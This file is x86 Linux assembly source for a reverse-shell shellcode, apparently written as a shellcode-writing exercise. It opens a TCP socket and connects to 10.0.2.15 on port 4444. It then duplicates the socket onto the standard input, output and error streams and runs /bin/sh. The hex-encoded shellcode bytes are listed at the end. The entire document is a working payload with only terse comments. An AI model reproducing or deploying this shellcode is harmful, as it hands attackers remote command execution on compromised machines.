global _start

section .text
_start:
; [ Create the socket ]
; socketcall(int call, unsigned long *args) eax 102 -> ebx, *esp
; socket(int domain, int type, int protocol)
	xor ebx, ebx
	mul ebx
	mov al, 102
	mov bl, 1
	push edx ; int protocol = 0
	push ebx ; int type = 1 -> SOCK_STREAM
	push 2	 ; domain = 2 -> AF_INET
	mov ecx, esp
	int 0x80
	; NOTE: eax contains sockfd

; [ Call connect system call on the socket ]
; store eax
; socketcall(int call, unsigned long *args) eax 102 -> ebx, *esp
; connect(int sockfd, const struct *sockaddr, addrlen) -> push eax, *esp, 16
	xchg edi, eax
	mul edx
	push 0x0f02000a			; IPADDR
	push word 0x5c11		; PORT 4444	
	push word 2	 			; AF_INET
	mov ebx, esp 			; point to the struct
	push byte 16			; addrlen 
	push ebx				; push pointer to the struct
	push edi				; push sockfd
	
	xor ebx, ebx
	mov al, 102
	mov bl, 3
	mov ecx, esp
	int 0x80
	; NOTE: clientfd now sits in eax
; [ Duplicate FD and write to STD(OUT|IN|ERR) ]
; dup(oldfd, newfd) eax 63  
	xchg eax, edx
	xor ecx, ecx
	mov ebx, edi
	mov cl, 2
dup2:
	mov al, 63
	int 0x80
	dec ecx
	jns dup2
	

; [ execve /bin/sh ]
; execve(const char *filename, push
;			   char *const argv[], 
;			   char *const envp[] 
;) eax 11
	xor eax, eax
	push eax
	;68732f6e69622f2f
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp

	mov al, 11
	int 0x80
  
; \x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80
; \x97\xf7\xe2\x68\x0a\x00\x02\x0f\x66\x68\x11\x5c\x66\x6a\x02\x89
; \xe3\x6a\x10\x53\x57\x31\xdb\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x92
; \x31\xc9\x89\xfb\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50
; \x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53
; \x89\xe1\xb0\x0b\xcd\x80
